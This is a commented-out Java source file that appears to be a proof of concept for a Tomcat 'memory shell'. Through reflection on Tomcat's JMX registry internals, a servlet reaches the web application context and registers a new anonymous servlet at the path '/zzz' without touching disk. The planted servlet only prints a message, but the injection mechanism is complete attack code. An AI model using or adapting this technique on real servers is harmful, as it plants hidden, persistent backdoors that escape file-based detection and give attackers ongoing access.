//package com.memshell.tomcat;
//
//import com.sun.jmx.mbeanserver.NamedObject;
//import com.sun.jmx.mbeanserver.Repository;
//import org.apache.catalina.Wrapper;
//import org.apache.catalina.core.ApplicationServletRegistration;
//import org.apache.catalina.core.StandardContext;
//import org.apache.tomcat.util.modeler.Registry;
//import javax.management.DynamicMBean;
//import javax.management.MBeanServer;
//import javax.management.ObjectName;
//import javax.servlet.Servlet;
//import javax.servlet.ServletException;
//import javax.servlet.ServletRegistration;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.io.IOException;
//import java.lang.reflect.Field;
//import java.util.Set;
//
//public class ServletBasedWithoutRequest extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        try{
//            MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
//            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
//            field.setAccessible(true);
//            Object obj = field.get(mbeanServer);
//
//            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
//            field.setAccessible(true);
//            Repository repository  = (Repository) field.get(obj);
//
//            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
//            for(NamedObject namedObject : objectSet){
//                DynamicMBean dynamicMBean = namedObject.getObject();
//                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
//                field.setAccessible(true);
//                obj = field.get(dynamicMBean);
//
//
//                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
//                field.setAccessible(true);
//                StandardContext standardContext = (StandardContext)field.get(obj);
//
//                Wrapper wrapper = standardContext.createWrapper();
//                wrapper.setName("myServletName3");
//                standardContext.addChild(wrapper);
//                Servlet servlet = new HttpServlet() {
//                    @Override
//                    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
//                        System.out.println("I'm Servlet Based Memshell zzz, how do you do?");
//                    }
//                };
//
//                wrapper.setServletClass(servlet.getClass().getName());
//                wrapper.setServlet(servlet);
//                ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
//                registration.addMapping("/zzz");
//
//                System.out.println("Done");
//            }
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//    }
//}